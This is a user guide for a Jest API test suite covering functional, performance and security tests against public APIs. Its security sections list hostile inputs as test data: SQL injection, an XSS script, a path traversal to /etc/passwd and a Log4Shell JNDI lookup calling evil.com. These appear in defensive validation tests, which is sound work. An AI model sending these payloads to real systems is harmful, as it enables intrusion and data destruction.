# API Test Suite - User Guide

## Table of Contents
- [Getting Started](#getting-started)
- [Test Categories](#test-categories)
- [Running Tests](#running-tests)
- [API Endpoints](#api-endpoints)
- [Writing Custom Tests](#writing-custom-tests)
- [Test Data Management](#test-data-management)
- [Reporting and Analysis](#reporting-and-analysis)
- [Performance Testing](#performance-testing)
- [Security Testing](#security-testing)
- [Best Practices](#best-practices)
- [Troubleshooting](#troubleshooting)

## Getting Started

### Prerequisites
- Node.js 16.x or higher
- npm or yarn package manager
- Internet connection for live API testing
- Basic understanding of REST APIs and HTTP methods

### Quick Start
```bash
# Clone the repository
git clone https://github.com/latorocka/api-test-suite.git
cd api-test-suite

# Install dependencies
npm install

# Run all tests
npm test

# Run specific test category
npm run test:functional
```

### Project Structure
```
api-test-suite/
├── tests/
│   ├── functional/         # CRUD operations testing
│   ├── integration/        # Cross-API workflow tests
│   ├── performance/        # Load and stress testing
│   ├── security/           # Security validation tests
│   ├── data-validation/    # Schema and data integrity
│   ├── graphql/           # GraphQL query testing
│   ├── websocket/         # Real-time connection tests
│   └── rest/              # RESTful API tests
├── server/                 # Mock server implementation
├── demo/                  # Live demonstration scripts
└── jest.config.js         # Test configuration
```

## Test Categories

### 1. Functional Testing
Tests core CRUD operations and basic API functionality.

```javascript
// Example: User CRUD operations
describe('User Management API', () => {
  test('should create a new user', async () => {
    const newUser = {
      name: 'John Doe',
      email: 'john@example.com',
      username: 'johndoe'
    };
    
    const response = await request(API_BASE_URL)
      .post('/users')
      .send(newUser)
      .expect(201);
      
    expect(response.body).toHaveProperty('id');
    expect(response.body.name).toBe(newUser.name);
  });
  
  test('should retrieve user by ID', async () => {
    const userId = 1;
    const response = await request(API_BASE_URL)
      .get(`/users/${userId}`)
      .expect(200);
      
    expect(response.body).toHaveProperty('id', userId);
    expect(response.body).toHaveProperty('name');
  });
});
```

### 2. Integration Testing
Tests workflows that span multiple API endpoints and services.

```javascript
describe('E-commerce Workflow Integration', () => {
  test('complete purchase workflow', async () => {
    // 1. Create user
    const user = await createTestUser();
    
    // 2. Add product to cart
    await addProductToCart(user.id, productId);
    
    // 3. Process checkout
    const order = await processCheckout(user.id);
    
    // 4. Verify order status
    const orderStatus = await getOrderStatus(order.id);
    expect(orderStatus).toBe('confirmed');
    
    // 5. Cleanup
    await cleanupTestData(user.id, order.id);
  });
});
```

### 3. Performance Testing
Measures API response times, throughput, and scalability.

```javascript
describe('Performance Testing', () => {
  test('should handle concurrent requests', async () => {
    const concurrentRequests = 50;
    const promises = [];
    
    for (let i = 0; i < concurrentRequests; i++) {
      promises.push(
        request(API_BASE_URL)
          .get('/posts')
          .expect(200)
      );
    }
    
    const startTime = Date.now();
    await Promise.all(promises);
    const endTime = Date.now();
    
    const totalTime = endTime - startTime;
    const averageTime = totalTime / concurrentRequests;
    
    expect(averageTime).toBeLessThan(1000); // 1 second max
  });
  
  test('response time under load', async () => {
    const response = await measureResponseTime(
      () => request(API_BASE_URL).get('/posts/1')
    );
    
    expect(response.time).toBeLessThan(500); // 500ms max
    expect(response.status).toBe(200);
  });
});
```

### 4. Security Testing
Validates API security measures and vulnerability protection.

```javascript
describe('Security Testing', () => {
  test('should prevent SQL injection', async () => {
    const maliciousInput = "'; DROP TABLE users; --";
    
    const response = await request(API_BASE_URL)
      .get(`/users?search=${encodeURIComponent(maliciousInput)}`)
      .expect(400); // Should reject malicious input
      
    expect(response.body.error).toContain('Invalid input');
  });
  
  test('should require authentication for protected endpoints', async () => {
    await request(API_BASE_URL)
      .post('/admin/users')
      .send({ name: 'Test User' })
      .expect(401); // Unauthorized without token
  });
  
  test('should validate input data', async () => {
    const invalidUser = {
      email: 'invalid-email', // Invalid email format
      age: -5 // Invalid age
    };
    
    const response = await request(API_BASE_URL)
      .post('/users')
      .send(invalidUser)
      .expect(422); // Validation error
      
    expect(response.body.errors).toBeDefined();
  });
});
```

### 5. Data Validation Testing
Ensures data integrity and schema compliance.

```javascript
describe('Data Validation', () => {
  test('should validate response schema', async () => {
    const response = await request(API_BASE_URL)
      .get('/users/1')
      .expect(200);
      
    const userSchema = {
      type: 'object',
      required: ['id', 'name', 'email'],
      properties: {
        id: { type: 'number' },
        name: { type: 'string' },
        email: { type: 'string', format: 'email' }
      }
    };
    
    expect(response.body).toMatchSchema(userSchema);
  });
  
  test('should maintain data consistency across endpoints', async () => {
    const userId = 1;
    
    // Get user from users endpoint
    const userResponse = await request(API_BASE_URL)
      .get(`/users/${userId}`)
      .expect(200);
      
    // Get same user from posts endpoint
    const postsResponse = await request(API_BASE_URL)
      .get(`/posts?userId=${userId}`)
      .expect(200);
      
    // Verify user data consistency
    if (postsResponse.body.length > 0) {
      expect(postsResponse.body[0].userId).toBe(userResponse.body.id);
    }
  });
});
```

## Running Tests

### Command Line Options
```bash
# Run all tests
npm test

# Run specific test categories
npm run test:functional
npm run test:integration
npm run test:performance
npm run test:security
npm run test:data-validation

# Run tests with specific APIs
npm run test:github
npm run test:jsonplaceholder
npm run test:spacex

# Run tests in watch mode
npm run test:watch

# Run tests with coverage
npm run test:coverage

# Run tests with detailed output
npm test -- --verbose

# Run specific test file
npm test -- tests/functional/users.test.js

# Run tests matching pattern
npm test -- --testNamePattern="user creation"
```

### Environment Configuration
```javascript
// config/test.config.js
module.exports = {
  apiEndpoints: {
    jsonplaceholder: 'https://jsonplaceholder.typicode.com',
    github: 'https://api.github.com',
    spacex: 'https://api.spacexdata.com/v4'
  },
  timeouts: {
    default: 5000,
    performance: 10000,
    integration: 30000
  },
  retries: {
    flaky: 3,
    network: 2
  }
};
```

### Test Execution Flow
1. **Setup**: Initialize test environment and dependencies
2. **Before Each**: Prepare test data and authentication
3. **Test Execution**: Run individual test cases
4. **After Each**: Cleanup test data and reset state
5. **Teardown**: Close connections and generate reports

## API Endpoints

### JSONPlaceholder API
```javascript
// Base URL: https://jsonplaceholder.typicode.com
const endpoints = {
  posts: '/posts',
  users: '/users',
  comments: '/comments',
  albums: '/albums',
  photos: '/photos',
  todos: '/todos'
};

// Example usage
test('should fetch all posts', async () => {
  const response = await request('https://jsonplaceholder.typicode.com')
    .get('/posts')
    .expect(200);
    
  expect(Array.isArray(response.body)).toBe(true);
  expect(response.body.length).toBeGreaterThan(0);
});
```

### GitHub API
```javascript
// Base URL: https://api.github.com
test('should get user repositories', async () => {
  const username = 'octocat';
  const response = await request('https://api.github.com')
    .get(`/users/${username}/repos`)
    .set('Accept', 'application/vnd.github.v3+json')
    .expect(200);
    
  expect(Array.isArray(response.body)).toBe(true);
  response.body.forEach(repo => {
    expect(repo).toHaveProperty('name');
    expect(repo).toHaveProperty('owner');
  });
});
```

### SpaceX GraphQL API
```javascript
test('should query SpaceX launches', async () => {
  const query = `
    query GetLaunches($limit: Int) {
      launches(limit: $limit) {
        id
        mission_name
        launch_date_utc
        rocket {
          rocket_name
        }
      }
    }
  `;
  
  const response = await request('https://api.spacexdata.com/v4/graphql')
    .post('/')
    .send({
      query,
      variables: { limit: 10 }
    })
    .expect(200);
    
  expect(response.body.data.launches).toBeDefined();
  expect(response.body.data.launches.length).toBeLessThanOrEqual(10);
});
```

## Writing Custom Tests

### Test Structure Template
```javascript
describe('API Test Suite Name', () => {
  let testData = {};
  
  beforeAll(async () => {
    // One-time setup for all tests
    testData = await setupTestData();
  });
  
  beforeEach(async () => {
    // Setup before each test
    await resetTestState();
  });
  
  afterEach(async () => {
    // Cleanup after each test
    await cleanupTestData();
  });
  
  afterAll(async () => {
    // One-time cleanup
    await teardownTestData();
  });
  
  test('should test specific functionality', async () => {
    // Test implementation
    const response = await apiCall();
    expect(response).toBeDefined();
  });
});
```

### Custom Matchers
```javascript
// Custom Jest matchers for API testing
expect.extend({
  toBeValidHttpStatus(received) {
    const validStatuses = [200, 201, 204, 400, 401, 403, 404, 500];
    const pass = validStatuses.includes(received);
    
    return {
      message: () => `expected ${received} to be a valid HTTP status`,
      pass
    };
  },
  
  toHaveValidApiStructure(received) {
    const hasValidStructure = 
      received && 
      typeof received === 'object' &&
      !Array.isArray(received);
      
    return {
      message: () => `expected response to have valid API structure`,
      pass: hasValidStructure
    };
  }
});
```

### Helper Functions
```javascript
// utils/apiHelpers.js
class ApiTestHelpers {
  static async makeRequest(method, url, data = null, headers = {}) {
    const config = {
      method,
      url,
      headers: {
        'Content-Type': 'application/json',
        ...headers
      }
    };
    
    if (data) {
      config.data = data;
    }
    
    try {
      const response = await axios(config);
      return {
        status: response.status,
        data: response.data,
        headers: response.headers
      };
    } catch (error) {
      return {
        status: error.response?.status || 0,
        error: error.message,
        data: error.response?.data
      };
    }
  }
  
  static generateTestUser() {
    return {
      name: `Test User ${Date.now()}`,
      email: `test${Date.now()}@example.com`,
      username: `user${Date.now()}`
    };
  }
  
  static async waitForCondition(condition, timeout = 5000) {
    const startTime = Date.now();
    
    while (Date.now() - startTime < timeout) {
      if (await condition()) {
        return true;
      }
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    throw new Error(`Condition not met within ${timeout}ms`);
  }
}
```

## Test Data Management

### Static Test Data
```javascript
// data/testData.js
export const testUsers = [
  {
    id: 1,
    name: 'John Doe',
    email: 'john@example.com',
    role: 'user'
  },
  {
    id: 2,
    name: 'Jane Admin',
    email: 'jane@example.com',
    role: 'admin'
  }
];

export const testPosts = [
  {
    title: 'Test Post 1',
    body: 'This is a test post content',
    userId: 1
  }
];
```

### Dynamic Test Data
```javascript
// utils/dataFactory.js
class DataFactory {
  static createUser(overrides = {}) {
    return {
      name: faker.name.fullName(),
      email: faker.internet.email(),
      username: faker.internet.userName(),
      address: {
        street: faker.address.streetAddress(),
        city: faker.address.city(),
        zipcode: faker.address.zipCode()
      },
      ...overrides
    };
  }
  
  static createPost(userId, overrides = {}) {
    return {
      title: faker.lorem.sentence(),
      body: faker.lorem.paragraphs(3),
      userId,
      ...overrides
    };
  }
}
```

### Database Integration
```javascript
// For tests requiring database operations
class DatabaseHelpers {
  static async seedTestData() {
    // Insert test data into database
    await db.users.bulkCreate(testUsers);
    await db.posts.bulkCreate(testPosts);
  }
  
  static async cleanupTestData() {
    // Remove test data from database
    await db.posts.destroy({ where: { userId: { [Op.in]: testUserIds } } });
    await db.users.destroy({ where: { id: { [Op.in]: testUserIds } } });
  }
  
  static async getTestUser(criteria) {
    return await db.users.findOne({ where: criteria });
  }
}
```

## Reporting and Analysis

### Test Results Output
```javascript
// Custom reporter configuration
module.exports = {
  reporters: [
    'default',
    ['jest-html-reporters', {
      publicPath: './reports',
      filename: 'api-test-report.html',
      expand: true
    }],
    ['jest-junit', {
      outputDirectory: './reports',
      outputName: 'junit.xml'
    }]
  ]
};
```

### Performance Metrics
```javascript
// Performance tracking
class PerformanceMetrics {
  static measurements = [];
  
  static async measureApiCall(apiCall, description) {
    const startTime = performance.now();
    const result = await apiCall();
    const endTime = performance.now();
    
    const measurement = {
      description,
      duration: endTime - startTime,
      timestamp: new Date().toISOString(),
      status: result.status
    };
    
    this.measurements.push(measurement);
    return { result, measurement };
  }
  
  static getAverageResponseTime() {
    const total = this.measurements.reduce((sum, m) => sum + m.duration, 0);
    return total / this.measurements.length;
  }
  
  static getSlowQueries(threshold = 1000) {
    return this.measurements.filter(m => m.duration > threshold);
  }
}
```

### Custom Reporting
```javascript
// Generate custom test reports
class TestReporter {
  static generateSummary(testResults) {
    const summary = {
      total: testResults.numTotalTests,
      passed: testResults.numPassedTests,
      failed: testResults.numFailedTests,
      coverage: testResults.coverageMap,
      performance: PerformanceMetrics.getAverageResponseTime(),
      timestamp: new Date().toISOString()
    };
    
    return summary;
  }
  
  static async generateDetailedReport(testResults) {
    const report = {
      summary: this.generateSummary(testResults),
      testSuites: testResults.testResults.map(suite => ({
        name: suite.testFilePath,
        tests: suite.testResults.map(test => ({
          name: test.title,
          status: test.status,
          duration: test.duration,
          error: test.failureMessages[0]
        }))
      }))
    };
    
    await fs.writeFile('./reports/detailed-report.json', JSON.stringify(report, null, 2));
    return report;
  }
}
```

## Performance Testing

### Load Testing
```javascript
describe('Load Testing', () => {
  test('should handle increasing load', async () => {
    const loadLevels = [10, 25, 50, 100];
    const results = [];
    
    for (const concurrency of loadLevels) {
      const promises = Array(concurrency).fill().map(() =>
        request(API_BASE_URL).get('/posts').expect(200)
      );
      
      const startTime = Date.now();
      await Promise.all(promises);
      const duration = Date.now() - startTime;
      
      results.push({
        concurrency,
        duration,
        averageTime: duration / concurrency
      });
    }
    
    // Verify performance doesn't degrade significantly
    const degradation = results[results.length - 1].averageTime / results[0].averageTime;
    expect(degradation).toBeLessThan(3); // Max 3x degradation
  });
});
```

### Stress Testing
```javascript
test('should handle stress conditions', async () => {
  const stressConfig = {
    concurrency: 200,
    duration: 30000, // 30 seconds
    rampUp: 5000     // 5 seconds to reach full load
  };
  
  const results = await runStressTest(stressConfig);
  
  expect(results.successRate).toBeGreaterThan(0.95); // 95% success rate
  expect(results.averageResponseTime).toBeLessThan(2000); // 2 second max
  expect(results.maxResponseTime).toBeLessThan(10000); // 10 second absolute max
});
```

## Security Testing

### Authentication Testing
```javascript
describe('Authentication Security', () => {
  test('should reject invalid tokens', async () => {
    const invalidToken = 'invalid-jwt-token';
    
    await request(API_BASE_URL)
      .get('/protected-resource')
      .set('Authorization', `Bearer ${invalidToken}`)
      .expect(401);
  });
  
  test('should validate token expiration', async () => {
    const expiredToken = generateExpiredToken();
    
    await request(API_BASE_URL)
      .get('/protected-resource')
      .set('Authorization', `Bearer ${expiredToken}`)
      .expect(401);
  });
});
```

### Input Validation
```javascript
describe('Input Validation Security', () => {
  test('should sanitize user input', async () => {
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      'Robert\'; DROP TABLE Students;--'
    ];
    
    for (const input of maliciousInputs) {
      const response = await request(API_BASE_URL)
        .post('/users')
        .send({ name: input })
        .expect(400);
        
      expect(response.body.error).toContain('Invalid input');
    }
  });
});
```

## Best Practices

### Test Organization
```javascript
// Group related tests
describe('User Management', () => {
  describe('Creation', () => {
    test('valid user creation', () => {});
    test('duplicate email prevention', () => {});
  });
  
  describe('Retrieval', () => {
    test('get user by ID', () => {});
    test('search users', () => {});
  });
  
  describe('Updates', () => {
    test('update user profile', () => {});
    test('change password', () => {});
  });
});
```

### Error Handling
```javascript
test('should handle network errors gracefully', async () => {
  // Simulate network failure
  const originalFetch = global.fetch;
  global.fetch = jest.fn(() => Promise.reject(new Error('Network error')));
  
  try {
    await expect(apiCall()).rejects.toThrow('Network error');
  } finally {
    global.fetch = originalFetch;
  }
});
```

### Test Isolation
```javascript
// Ensure tests don't affect each other
beforeEach(async () => {
  // Reset database state
  await resetDatabase();
  
  // Clear cache
  await clearCache();
  
  // Reset mocks
  jest.clearAllMocks();
});
```

## Troubleshooting

### Common Issues

#### Network Timeouts
```javascript
// Increase timeout for slow APIs
jest.setTimeout(30000);

// Or per test
test('slow API call', async () => {
  // Test implementation
}, 15000); // 15 second timeout
```

#### Rate Limiting
```javascript
// Handle rate limits with retry logic
async function makeRequestWithRetry(apiCall, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await apiCall();
    } catch (error) {
      if (error.response?.status === 429 && i < maxRetries - 1) {
        // Wait before retry (exponential backoff)
        await new Promise(resolve => setTimeout(resolve, Math.pow(2, i) * 1000));
        continue;
      }
      throw error;
    }
  }
}
```

#### CORS Issues
```javascript
// For browser-based testing, configure CORS properly
const corsOptions = {
  origin: 'http://localhost:3000',
  credentials: true,
  optionsSuccessStatus: 200
};
```

### Debug Mode
```javascript
// Enable debug logging
process.env.DEBUG = 'api-test:*';

// Add debug information to tests
test('debug example', async () => {
  console.log('Request URL:', API_BASE_URL);
  console.log('Test environment:', process.env.NODE_ENV);
  
  const response = await request(API_BASE_URL).get('/users');
  console.log('Response status:', response.status);
  console.log('Response headers:', response.headers);
});
```

---

**Need Help?** Contact: latorocka@gmail.com